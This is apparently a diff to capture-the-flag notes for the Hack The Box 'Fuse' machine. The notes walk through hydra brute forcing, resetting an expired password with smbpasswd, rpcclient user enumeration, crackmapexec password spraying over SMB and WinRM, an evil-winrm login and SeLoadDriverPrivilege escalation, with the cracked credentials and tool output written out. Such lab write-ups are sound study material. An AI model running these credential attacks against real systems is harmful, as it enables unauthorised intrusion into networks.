@@ -56,5 +56,45 @@ We then test hits using hydra as follows : hydra -L users -P pwd.txt 10.10.10.19
 [445][smb] Host: 10.10.10.193 Account: bhult Valid password, password expired and must be changed on next logon
 [445][smb] host: 10.10.10.193 login: bhult   password: Fabricorp01
 
-Test login using smbclient as: smbclient -L 10.10.10.193 -U tlavel
+Test login using smbclient as: smbclient -L 10.10.10.193 -U tlavel | bhult
+session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
+Change the password as : smbpasswd -r 10.10.10.193 -U tlavel | bhult
+Fabricorp01
+Fabricorp02
+Password changed for user tlavel on 10.10.10.193.
+Access rpcclient as : rpcclient -U tlavel 10.10.10.193
+More users noted through rpcclient $> enumdomusers : svc-print, bnielson,pmerton, svc-scan, dandrews, mberbatov, astein, dmuir, 
+And a password : rpcclient $> enumprinters
+password: $fab@s3Rv1ce$1
+
+We move on to perform a Password spraying attack
+crackmapexec smb 10.10.10.193 -u users -p '$fab@s3Rv1ce$1' --continue-o
+SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1
+SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-scan:$fab@s3Rv1ce$1
+crackmapexec winrm 10.10.10.193 -u users -p '$fab@s3Rv1ce$1'
+WINRM       10.10.10.193    5985   FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)
+
+Winrm login : evil-winrm -i 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
+===================
+Privilege Escalation
+*Evil-WinRM* PS C:\Users\svc-print\Desktop> whoami /all
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+++ SeLoadDriverPrivilege         Load and unload device drivers Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+"To elevate to a higher-level user, we enumerated the Privileges of the current user. 
+It showed that SeLoadDrivverPrivilege is Enabled for current user. It is a very dangerous privilege. 
+It allows the user to load kernel drivers and execute code with kernel privileges."
+
+
+References
+1. https://www.hackingarticles.in/fuse-hackthebox-walkthrough/
+2. https://www.hackingarticles.in/comprehensive-guide-on-password-spraying-attack/
 
